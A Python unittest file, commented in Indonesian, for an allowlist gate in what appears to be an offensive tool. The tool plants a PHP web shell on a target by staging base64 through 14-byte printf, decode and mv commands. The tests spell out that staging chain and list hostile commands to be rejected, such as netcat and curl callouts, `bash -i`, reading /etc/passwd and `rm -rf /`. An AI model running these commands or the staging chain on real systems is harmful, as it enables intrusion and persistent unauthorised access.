"""Tes regresi RR-2 — gerbang perintah carrier `shell/upshell_live.py`.

Latar (residual audit round 2, RR-2):
`full_chain_cmd()` membangun perintah seperti `base64 -d<v>g`, `mv g s.php`,
`rm v`. Semua itu MEMANG memuat token yang dilarang
`exploit_runner.FORBIDDEN_CMD_TOKENS` (`<`, `>`, `rm `) — jadi jalur ini tidak
mungkin memakai `validate_command()`, dan sebelumnya tidak punya pagar sendiri.
Fungsi itu menerima string apa pun: `full_chain_cmd(base, "sh</out/c")` =
eksekusi string bebas di target.

Perbaikan: `validate_carrier_cmd()` dengan allowlist BENTUK
(`_CARRIER_FORMS`). Setiap bentuk dibangun modul ini sendiri dari input yang
sudah divalidasi; tidak ada yang menerima string bebas.

Tes di sini mengunci dua sisi:
  1. setiap bentuk yang BENAR-BENAR dipakai modul lolos (tidak ada regresi
     fungsional — shell masih bisa ditanam),
  2. apa pun yang bukan bentuk itu ditolak, khususnya perintah shell bebas.
"""

import os
import re
import sys
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)

from shell import upshell_live as up  # noqa: E402


class TestCarrierFormsDipakaiModul(unittest.TestCase):
    """Bentuk yang benar-benar dipakai skrip harus lolos validator."""

    def test_printf_tulis_staging(self):
        # write_v_verified(): `printf '<char>' >v` lalu `printf '<char>' >>v`
        for cmd in ("printf 'A' >v", "printf '/' >>v", "printf '=' >v",
                    "printf '+' >>v"):
            with self.subTest(cmd=cmd):
                self.assertEqual(up.validate_carrier_cmd(cmd), "")

    def test_decode_staging(self):
        self.assertEqual(up.validate_carrier_cmd("base64 -d<v>g"), "")

    def test_pasang_shell(self):
        for name in ("s.php", "a1.php", "my-s_h.e.l.php"):
            with self.subTest(name=name):
                n = name[:32]
                if not n.endswith(".php"):
                    n += ".php"
                cmd = f"mv g {n}"
                if len(cmd.encode()) <= up.CARRIER_MAX:
                    self.assertEqual(up.validate_carrier_cmd(cmd), "")

    def test_bersihkan_artefak(self):
        for cmd in ("rm v", "rm g", "rm s.php", "rm a1.php"):
            with self.subTest(cmd=cmd):
                self.assertEqual(up.validate_carrier_cmd(cmd), "")


class TestCarrierRejectsFreeStrings(unittest.TestCase):
    """Inti RR-2: string bebas TIDAK boleh lolos ke target."""

    def test_perintah_shell_bebas_ditolak(self):
        for cmd in ("id", "whoami", "sh</out/c", "ls", "ls /", "cat /etc/passwd",
                    "nc 1.2.3.4 4444", "bash -i", "curl http://evil",
                    "python -c 1", "uname -a", "ps aux"):
            with self.subTest(cmd=cmd):
                self.assertNotEqual(up.validate_carrier_cmd(cmd), "",
                                    f"{cmd!r} lolos gerbang carrier")

    def test_chaining_ditolak(self):
        for cmd in ("printf 'A' >v; id", "rm v && id", "rm v; nc 1.2.3.4 4",
                    "printf 'A' >v|id", "base64 -d<v>g; id"):
            with self.subTest(cmd=cmd):
                self.assertNotEqual(up.validate_carrier_cmd(cmd), "")

    def test_path_traversal_pada_nama_shell_ditolak(self):
        for cmd in ("mv g ../x.php", "mv g ../../x.php", "mv g /x.php",
                    "mv g x.php/../../y.php"):
            with self.subTest(cmd=cmd):
                self.assertNotEqual(up.validate_carrier_cmd(cmd), "")

    def test_nama_tanpa_ekstensi_php_ditolak(self):
        for cmd in ("mv g x", "mv g x.sh", "mv g x.php.bak"):
            with self.subTest(cmd=cmd):
                self.assertNotEqual(up.validate_carrier_cmd(cmd), "")

    def test_rm_selain_artefak_ditolak(self):
        for cmd in ("rm -rf /", "rm /etc/passwd", "rm x", "rm ../x.php",
                    "rm .htaccess"):
            with self.subTest(cmd=cmd):
                self.assertNotEqual(up.validate_carrier_cmd(cmd), "")

    def test_printf_bukan_format_char_ditolak(self):
        for cmd in ('printf "A" >v', "printf '%s' >v", "printf A >v",
                    "printf 'AB' >v", "printf 'A' >v2"):
            with self.subTest(cmd=cmd):
                self.assertNotEqual(up.validate_carrier_cmd(cmd), "")

    def test_kosong_dan_bukan_string_ditolak(self):
        for cmd in ("", None, 0, b"rm v"):
            with self.subTest(cmd=cmd):
                self.assertNotEqual(up.validate_carrier_cmd(cmd), "")

    def test_batas_14_byte_tetap_ditegakkan(self):
        long_cmd = "rm " + "a" * 20 + ".php"
        self.assertGreater(len(long_cmd.encode()), up.CARRIER_MAX)
        why = up.validate_carrier_cmd(long_cmd)
        self.assertNotEqual(why, "")
        self.assertIn("byte", why)


class TestFullChainCmdGate(unittest.TestCase):
    """`full_chain_cmd()` harus menolak SEBELUM menyentuh jaringan."""

    def test_string_bebas_ditolak_tanpa_koneksi(self):
        # URL sengaja tidak bisa dijangkau; kalau gate bocor, fungsi akan
        # mencoba konek dan menghabiskan waktu. Yang diuji: ValueError cepat.
        with self.assertRaises(ValueError) as ctx:
            up.full_chain_cmd("http://127.0.0.1:9/", "sh</out/c",
                              attempts=1, log=lambda _s: None)
        self.assertIn("bukan bentuk carrier", str(ctx.exception))

    def test_batas_byte_ditolak_sebelum_koneksi(self):
        with self.assertRaises(ValueError):
            up.full_chain_cmd("http://127.0.0.1:9/", "x" * 20,
                              attempts=1, log=lambda _s: None)

    def test_bentuk_sah_tidak_melempar_valueerror(self):
        """Bentuk sah boleh gagal karena jaringan, bukan karena gate."""
        try:
            up.full_chain_cmd("http://127.0.0.1:9/", "rm v", attempts=1,
                              log=lambda _s: None)
        except ValueError as exc:  # gate salah menolak bentuk sah
            self.fail(f"gate menolak bentuk sah: {exc}")
        except Exception:  # noqa: BLE001 - kegagalan jaringan wajar
            pass


class TestFormsCoverAllModuleUsages(unittest.TestCase):
    """Setiap perintah yang dibangun skrip sendiri harus tercakup pola.

    Tidak memakai regex atas source (rapuh: label dan docstring ikut cocok).
    Yang diuji adalah perintah yang BENAR-BENAR dihasilkan modul, dibangun
    ulang di sini mengikuti kode aslinya:
      * `write_v_verified()`: `printf '<ch>' >v` untuk char pertama lalu
        `printf '<ch>' >>v` untuk sisanya — char berasal dari base64 shell;
      * `full_chain_cmd("base64 -d<v>g")`;
      * `full_chain_cmd(f"mv g {shell_name}")` dengan nama hasil validate_name;
      * `rm v`, `rm g`, `rm <nama>`.
    """

    BASE64_CHARS = ("ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                    "abcdefghijklmnopqrstuvwxyz0123456789+/=")

    def test_setiap_char_base64_bisa_ditulis(self):
        for i, ch in enumerate(self.BASE64_CHARS):
            cmd = f"printf '{ch}' >v" if i == 0 else f"printf '{ch}' >>v"
            with self.subTest(ch=ch, cmd=cmd):
                self.assertEqual(up.validate_carrier_cmd(cmd), "",
                                 f"char base64 {ch!r} tidak bisa ditulis")
                self.assertLessEqual(len(cmd.encode()), up.CARRIER_MAX)

    def test_nama_shell_dari_validate_name_tercakup(self):
        for raw in ("s.php", "a.php", "shell1.php", "my-s_h.e.l.php", "A.php"):
            name = up.validate_name(raw)
            for cmd in (f"mv g {name}", f"rm {name}"):
                with self.subTest(cmd=cmd):
                    if len(cmd.encode()) > up.CARRIER_MAX:
                        continue  # carrier_check() sudah menolak ini lebih dulu
                    self.assertEqual(up.validate_carrier_cmd(cmd), "",
                                     f"perintah sah {cmd!r} ditolak gate")

    def test_perintah_tetap_modul_tercakup(self):
        for cmd in ("base64 -d<v>g", "rm v", "rm g"):
            with self.subTest(cmd=cmd):
                self.assertEqual(up.validate_carrier_cmd(cmd), "")


if __name__ == "__main__":
    unittest.main(verbosity=2)